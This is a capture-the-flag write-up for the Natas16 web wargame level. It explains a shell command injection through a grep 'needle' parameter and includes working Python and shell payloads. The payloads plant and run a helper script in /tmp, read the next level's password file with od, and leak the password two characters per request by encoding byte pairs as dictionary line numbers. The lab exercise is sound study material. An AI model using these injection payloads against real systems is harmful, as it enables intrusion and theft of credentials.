# Natas16

## Solution 1: exfiltrating the password 2-characters per request 

Vulnerabilities:
- Shell comannd injection using: $( ) and < >
- Read/Write/Execute access to /tmp folder

### Making use of large result set
This approach takes advantage of the large amount of possible return values, to minimize the number of requests needed to get the password.
In this case, only 16 requests were needed to exfiltrate the 32-characters password.

The file 'dictionary.txt' has 50253 unique rows, so an exploit can signal any value in the range 1-50253.
For example, to signal the value 9158 we can check what is the word that line in the dictionary => congratulations.
By providing _^congratulations$_ to the grep command, we should get the same word on the html output.
Wrapped with ^ and $ guarantees no characters before and after the search string.

On the client side, the response word could be the searched in a local copy of dictionary and the found line number would be the signaled number.

### "Shifter" Helper utility - pick one parameter from a list by its index
This bash script was needed to bypass pipes and quotes characters filters.
code:
shift $1
echo $1

usage:
shifter.sh 3 100 200 300 400 500
will return 300

In order to install this script:
1. Encode it as base64.
```python
shifter_script = "shift $1\necho $1\n\n"
shifter_b64 = base64.b64encode(bytes(shifter_script,"ascii")).decode('ascii')
```

2. Write it to /tmp folder
```python
payload = f'$(echo -n {shifter_b64} > /tmp/shifter.b64)'
r = requests.get(f'{base_url}/?needle={quote(payload)})', auth=auth)
```  

3. Base64 decode it
```python
payload = '$(base64 -d < /tmp/shifter.b64 > /tmp/shifter.sh)'
r = requests.get(f'{base_url}/?needle={quote(payload)})', auth=auth)
```

4. Make it executable
```python
payload='$(chmod a+x /tmp/shifter.sh)'
r = requests.get(f'{base_url}/?needle={quote(payload)})', auth=auth)
```

### Getting a copy of dictionary.txt
```python
r = requests.get(f'{base_url}/dictionary.txt', auth=auth)
diclines = r.text.splitlines() 
```

### Exfiltrating the password characters
Since the password has only ASCII characters (code < 128), each pair of characters packed as 16-bit unsigned intger would have the maximum value of:
127*256 + 127 = 32639. This fits nicely into the 50253 options available.

So, for each character pair, the request should perform:

* Convert the password string to a list of 16-bit unsigned int numbers (each pair of characters to a number)
```
od -An -tu2 -w64 < /etc/natas_webpass/natas17
```

* Pick a specific number from a list
```
/tmp/shifter.sh {index} {list of numbers}
```

* Search the dictionary for a specific line number:
```
sed -n {line_number}p < dictionary.txt
```

```python
matches = []
for pair in range(1,17): 
  payload=f'^$(sed -n $(/tmp/shifter.sh {pair} $(od -An -tu2 -w64 < /etc/natas_webpass/natas17))p < dictionary.txt)$'
  r = requests.post(base_url, data={"needle": payload}, auth=auth)
  reply_text = r.text.replace('\n', ' ').replace('\r', '')
  m = re.search('<pre>(.+)</pre>', reply_text)
  word = m.group(1).strip()
  matches.append(word)
```

Result processing:
The HTML result for each request is parsed using Regex to extract matching word.
That word is searched on the dictionary to get its line number.
The line number is split to two bytes that are converted to characters.

All the resulting characters are then combined to the target password

```python
elb = []
for m in matches:
  i = diclines.index(m)+1
  elb.append(i & 255)
  elb.append(i >> 8)

#password
print("".join([chr(c) for c in elb]))

#cleanup
payload = '$(rm /tmp/shifter.*)'
r = requests.get(f'{base_url}/?needle={quote(payload)})', auth=auth)
```
